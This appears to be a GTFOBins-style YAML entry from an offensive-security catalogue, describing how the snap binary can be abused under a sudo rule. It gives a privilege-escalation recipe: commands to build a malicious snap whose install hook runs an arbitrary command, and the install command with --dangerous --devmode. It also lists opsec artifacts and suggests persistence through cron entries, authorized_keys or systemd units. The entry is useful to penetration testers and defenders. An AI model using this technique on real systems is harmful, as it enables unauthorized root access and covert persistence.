---
name: snap
capabilities:
- exec
required_permissions:
  level: sudo
  notes: Requires sudo rule for this binary.
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: command
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: snap install xxxx_1.0_all.snap --dangerous --devmode
  notes: |-
    Generate the Snap package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

    ```
    mkdir -p meta/hooks
    echo -e '#!/bin/sh\n/path/to/command; false' >meta/hooks/install
    chmod +x meta/hooks/install
    fpm -n xxxx -s dir -t snap -a all meta
    ```
references:
- https://gtfobins.github.io/gtfobins/snap/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
